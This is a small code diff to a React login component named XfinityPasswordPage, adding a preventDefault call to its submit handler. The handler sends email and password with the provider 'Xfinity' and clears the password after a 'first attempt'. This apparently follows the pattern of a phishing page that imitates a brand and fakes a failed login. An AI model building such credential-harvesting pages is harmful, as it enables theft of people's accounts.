@@ -28,6 +28,7 @@ const XfinityPasswordPage: React.FC<XfinityPasswordPageProps> = ({ onLoginSucces
   }, [email]);
 
   const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
     const result = await handleFormSubmit(e, { email, password, provider: 'Xfinity' });
     if (result?.isFirstAttempt) {
       setPassword('');
